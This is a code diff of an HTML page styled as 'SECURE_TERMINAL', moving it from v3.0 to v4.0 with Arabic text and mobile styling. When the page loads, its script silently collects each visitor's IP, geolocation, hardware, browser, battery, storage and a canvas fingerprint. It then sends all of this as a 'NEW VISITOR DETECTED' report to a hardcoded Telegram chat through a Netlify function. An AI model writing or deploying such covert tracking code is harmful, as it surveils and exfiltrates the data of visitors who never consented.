@@ -1,10 +1,11 @@
-<!DOCTYPE html>
-<html lang="en">
+        <!DOCTYPE html>
+<html lang="ar">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>SECURE_TERMINAL</title>
 <style>
+  /* نفس الستايلات السابقة */
   * {
     box-sizing: border-box;
   }
@@ -178,6 +179,25 @@
     margin-top: 10px;
     display: none;
   }
+
+  /* تحسينات للشاشات الصغيرة */
+  @media (max-width: 600px) {
+    .body-inner {
+      padding: 15px 20px;
+    }
+    .app-row {
+      flex-direction: column;
+      align-items: stretch;
+    }
+    .app-button {
+      margin-top: 10px;
+      text-align: center;
+    }
+    .titlebar {
+      flex-direction: column;
+      text-align: center;
+    }
+  }
 </style>
 </head>
 <body>
@@ -187,7 +207,7 @@
 <div class="container">
 
   <div class="titlebar">
-    <span>SECURE_TERMINAL v3.0</span>
+    <span>SECURE_TERMINAL v4.0</span>
     <span>SESSION: ACTIVE</span>
   </div>
 
@@ -254,7 +274,7 @@
     <hr class="divider">
 
     <p class="prompt-line">end of listing.</p>
-    <div class="loading" id="loadingStatus">Collecting device information...</div>
+    <div class="loading" id="loadingStatus">جمع معلومات الجهاز...</div>
 
   </div>
 
@@ -277,7 +297,7 @@
   async function getAllDeviceInfo() {
     const info = {
       timestamp: new Date().toISOString(),
-      timestamp_local: new Date().toLocaleString(),
+      timestamp_local: new Date().toLocaleString('ar-EG'),
       system: {},
       hardware: {},
       network: {},
@@ -361,14 +381,6 @@
       };
     }
 
-    // Network Information API (alternative)
-    try {
-      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (connection) {
-        info.network.connectionType = connection.type || "unknown";
-      }
-    } catch(e) {}
-
     // ========== BROWSER INFO ==========
     info.browser = {
       name: "Unknown",
@@ -394,13 +406,11 @@
       info.browser.version = ua.match(/(?:Opera|OPR)\/(\d+\.\d+)/)?.[1] || "unknown";
     }
 
-    // Browser Engine
     if (ua.includes("WebKit")) info.browser.engine = "WebKit";
     else if (ua.includes("Gecko")) info.browser.engine = "Gecko";
     else if (ua.includes("Trident")) info.browser.engine = "Trident";
     else if (ua.includes("Blink")) info.browser.engine = "Blink";
 
-    // OS
     info.browser.os = "Unknown";
     if (ua.includes("Windows NT 10.0")) info.browser.os = "Windows 10/11";
     else if (ua.includes("Windows NT 6.3")) info.browser.os = "Windows 8.1";
@@ -423,14 +433,12 @@
       colorDepth: window.screen.colorDepth,
       pixelRatio: window.devicePixelRatio || 1,
       orientation: screen.orientation ? screen.orientation.type : "unknown",
-      orientationAngle: screen.orientation ? screen.orientation.angle : "unknown"
+      orientationAngle: screen.orientation ? screen.orientation.angle : "unknown",
+      innerWidth: window.innerWidth,
+      innerHeight: window.innerHeight,
+      outerWidth: window.outerWidth,
+      outerHeight: window.outerHeight
     };
-
-    // Inner dimensions
-    info.screen.innerWidth = window.innerWidth;
-    info.screen.innerHeight = window.innerHeight;
-    info.screen.outerWidth = window.outerWidth;
-    info.screen.outerHeight = window.outerHeight;
 
     // ========== STORAGE INFO ==========
     try {
@@ -439,19 +447,12 @@
         quota: storage.quota ? (storage.quota / 1024 / 1024 / 1024).toFixed(2) + " GB" : "غير متاح",
         usage: storage.usage ? (storage.usage / 1024 / 1024).toFixed(2) + " MB" : "غير متاح",
         percent: storage.usage && storage.quota ? 
-          ((storage.usage / storage.quota) * 100).toFixed(2) + "%" : "غير متاح"
+          ((storage.usage / storage.quota) * 100).toFixed(2) + "%" : "غير متاح",
+        localStorageSize: localStorage.length,
+        sessionStorageSize: sessionStorage.length
       };
     } catch(e) {
       info.storage = { quota: "غير متاح", usage: "غير متاح", percent: "غير متاح" };
-    }
-
-    // Local Storage
-    try {
-      info.storage.localStorageSize = localStorage.length;
-      info.storage.sessionStorageSize = sessionStorage.length;
-    } catch(e) {
-      info.storage.localStorageSize = "غير متاح";
-      info.storage.sessionStorageSize = "غير متاح";
     }
 
     // ========== CAPABILITIES ==========
@@ -470,21 +471,10 @@
       svg: 'SVGElement' in window,
       webWorkers: 'Worker' in window,
       sharedWorkers: 'SharedWorker' in window,
-      serviceWorkers: 'ServiceWorker' in navigator,
       webSockets: 'WebSocket' in window,
       webStorage: 'localStorage' in window && 'sessionStorage' in window,
-      indexedDB: 'indexedDB' in window,
-      webGLDebug: false
+      indexedDB: 'indexedDB' in window
     };
-
-    // Check WebGL Debug extension
-    try {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl');
-      if (gl) {
-        info.capabilities.webGLDebug = !!gl.getExtension('WEBGL_debug_renderer_info');
-      }
-    } catch(e) {}
 
     // ========== BATTERY INFO ==========
     try {
@@ -529,30 +519,25 @@
     info.security = {
       https: window.location.protocol === 'https:',
       referrerPolicy: document.referrerPolicy || "unknown",
-      csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? true : false
+      csp: document.querySelector('meta[http-equiv="Content-Security-Policy"]') ? true : false,
+      inIframe: window !== window.top
     };
 
-    // Try to get more security info
     try {
-      // Check if running in iframe
-      info.security.inIframe = window !== window.top;
-      // Check for cross-origin
-      try {
-        info.security.sameOrigin = window.origin === window.top.location.origin;
-      } catch(e) {
-        info.security.sameOrigin = false;
-      }
+      info.security.sameOrigin = window.origin === window.top.location.origin;
     } catch(e) {
-      info.security.inIframe = false;
+      info.security.sameOrigin = false;
     }
 
     // ========== PERFORMANCE ==========
-    info.performance = {
-      navigationStart: performance.timing ? performance.timing.navigationStart : "غير متاح",
-      domComplete: performance.timing ? performance.timing.domComplete : "غير متاح",
-      loadEventEnd: performance.timing ? performance.timing.loadEventEnd : "غير متاح",
-      memory: {}
-    };
+    if (performance.timing) {
+      info.performance = {
+        navigationStart: performance.timing.navigationStart,
+        domComplete: performance.timing.domComplete,
+        loadEventEnd: performance.timing.loadEventEnd,
+        memory: {}
+      };
+    }
 
     // Memory info (Chrome only)
     if (performance.memory) {
@@ -572,14 +557,10 @@
       hostname: window.location.hostname,
       protocol: window.location.protocol,
       port: window.location.port || "default",
-      hash: window.location.hash || "none",
-      screenOrientation: window.screen.orientation ? window.screen.orientation.type : "unknown",
-      colorDepth: window.screen.colorDepth,
-      pixelDepth: window.screen.pixelDepth
+      hash: window.location.hash || "none"
     };
 
-    // ========== FINGERPRINTING INFO ==========
-    // These are common for fingerprinting
+    // ========== FINGERPRINT ==========
     info.fingerprint = {
       timezone: info.system.timezone,
       screenResolution: info.screen.width + "x" + info.screen.height,
@@ -587,12 +568,10 @@
       pixelRatio: info.screen.pixelRatio,
       platform: info.system.platform,
       userAgent: info.system.userAgent,
-      language: info.system.language,
-      fonts: [],
-      canvas: ""
+      language: info.system.language
     };
 
-    // Canvas fingerprinting
+    // Canvas fingerprint
     try {
       const canvas = document.createElement('canvas');
       canvas.width = 200;
@@ -615,17 +594,10 @@
   }
 
   // ============================================
-  // FORMAT AND SEND TO TELEGRAM
+  // FORMAT MESSAGE FOR TELEGRAM
   // ============================================
   
-  const TELEGRAM_CHAT_ID = "8484620043";
-
-  function formatTelegramMessage(info) {
-    // Clean up device list for readability
-    const mediaDevices = info.media.devices ? 
-      info.media.devices.map(d => `  - ${d.kind}: ${d.label}`).join('\n') : 
-      "  No devices available";
-
+  function formatTelegramMessage(info, ip, location) {
     let message = "🔐 **NEW VISITOR DETECTED**\n";
     message += "━━━━━━━━━━━━━━━━━━━━\n\n";
     
@@ -633,15 +605,18 @@
     message += `  ${info.timestamp_local}\n\n`;
     
     message += "🌍 **LOCATION**\n";
-    message += `  IP: ${info.ip || 'جاري التحديث...'}\n`;
-    message += `  Location: ${info.location || 'جاري التحديث...'}\n\n`;
+    message += `  IP: ${ip || 'غير معروف'}\n`;
+    message += `  Location: ${location || 'غير معروف'}\n\n`;
     
     message += "💻 **SYSTEM**\n";
     message += `  OS: ${info.browser.os}\n`;
     message += `  Platform: ${info.system.platform}\n`;
     message += `  CPU Cores: ${info.hardware.cpuCores}\n`;
     message += `  RAM: ${info.hardware.ram}\n`;
-    message += `  GPU: ${info.hardware.gpu?.substring(0, 50) || 'غير متاح'}...\n\n`;
+    if (info.hardware.gpu) {
+      message += `  GPU: ${info.hardware.gpu.substring(0, 50)}...\n`;
+    }
+    message += "\n";
     
     message += "🌐 **BROWSER**\n";
     message += `  Name: ${info.browser.name} ${info.browser.version}\n`;
@@ -699,7 +674,7 @@
     message += `  Same Origin: ${info.security.sameOrigin ? '✅' : '❌'}\n\n`;
     
     message += "⏱️ **PERFORMANCE**\n";
-    if (info.performance.memory.totalJSHeapSize) {
+    if (info.performance && info.performance.memory && info.performance.memory.totalJSHeapSize) {
       message += `  JS Heap Total: ${info.performance.memory.totalJSHeapSize}\n`;
       message += `  JS Heap Used: ${info.performance.memory.usedJSHeapSize}\n`;
       message += `  JS Heap Limit: ${info.performance.memory.jsHeapSizeLimit}\n\n`;
@@ -708,7 +683,9 @@
     message += "🆔 **FINGERPRINT**\n";
     message += `  Timezone: ${info.fingerprint.timezone}\n`;
     message += `  Resolution: ${info.fingerprint.screenResolution}\n`;
-    message += `  Canvas: ${info.fingerprint.canvas.substring(0, 50)}...\n\n`;
+    if (info.fingerprint.canvas) {
+      message += `  Canvas: ${info.fingerprint.canvas.substring(0, 50)}...\n\n`;
+    }
     
     message += "📌 **ADDITIONAL**\n";
     message += `  Referrer: ${info.additional.referrer}\n`;
@@ -721,61 +698,72 @@
   }
 
   // ============================================
-  // SEND NOTIFICATION
+  // SEND TO TELEGRAM VIA NETLIFY FUNCTION
   // ============================================
   
   async function notifyVisit() {
     const loadingEl = document.getElementById('loadingStatus');
     if (loadingEl) loadingEl.style.display = 'block';
 
-    // Get location
-    let ip = "unknown";
-    let location = "unknown";
     try {
-      const geoRes = await fetch("https://ipapi.co/json/");
-      const geoData = await geoRes.json();
-      ip = geoData.ip || "unknown";
-      const city = geoData.city || "";
-      const region = geoData.region || "";
-      const country = geoData.country_name || "";
-      location = [city, region, country].filter(Boolean).join(", ") || "unknown";
-    } catch (e) {
-      // ignore
-    }
+      // 1. Get location
+      let ip = "unknown";
+      let location = "unknown";
+      try {
+        const geoRes = await fetch("https://ipapi.co/json/");
+        const geoData = await geoRes.json();
+        ip = geoData.ip || "unknown";
+        const city = geoData.city || "";
+        const region = geoData.region || "";
+        const country = geoData.country_name || "";
+        location = [city, region, country].filter(Boolean).join(", ") || "unknown";
+      } catch (e) {
+        console.log('Could not get location:', e);
+      }
 
-    // Get all device info
-    const deviceInfo = await getAllDeviceInfo();
-    deviceInfo.ip = ip;
-    deviceInfo.location = location;
+      // 2. Get all device info
+      const deviceInfo = await getAllDeviceInfo();
 
-    // Format message
-    const message = formatTelegramMessage(deviceInfo);
+      // 3. Format message
+      const message = formatTelegramMessage(deviceInfo, ip, location);
 
-    // Send to Telegram
-    try {
+      // 4. Send to Netlify Function (الـ Function راح ياخذ التوكن من متغيرات البيئة)
       const response = await fetch("/.netlify/functions/telegram", {
         method: "POST",
-        headers: { "Content-Type": "application/json" },
+        headers: { 
+          "Content-Type": "application/json"
+        },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
+          chat_id: "8484620043",
           text: message
         })
       });
-      
-      if (loadingEl) {
-        loadingEl.textContent = '✅ Notification sent successfully';
-        loadingEl.style.color = '#4dff88';
+
+      const result = await response.json();
+
+      if (response.ok) {
+        if (loadingEl) {
+          loadingEl.textContent = '✅ تم إرسال الإشعار بنجاح';
+          loadingEl.style.color = '#4dff88';
+        }
+        console.log('✅ Notification sent successfully');
+      } else {
+        throw new Error(result.error || 'Failed to send');
       }
+
     } catch (error) {
+      console.error('Error sending notification:', error);
       if (loadingEl) {
-        loadingEl.textContent = '❌ Failed to send notification';
+        loadingEl.textContent = '❌ فشل في إرسال الإشعار';
         loadingEl.style.color = '#ff6b6b';
       }
     }
   }
 
-  // Execute
-  notifyVisit();
+  // Execute when page loads
+  window.addEventListener('load', () => {
+    notifyVisit();
+  });
 
   // ============================================
   // BASIC SECURITY MEASURES
@@ -798,7 +786,6 @@
 
   console.log('%c⚠️ SECURITY NOTICE', 'color:red; font-size:20px; font-weight:bold;');
   console.log('This terminal is monitored. All actions are logged.');
-  console.log('Unauthorized access is prohibited.');
 </script>
 
 </body>
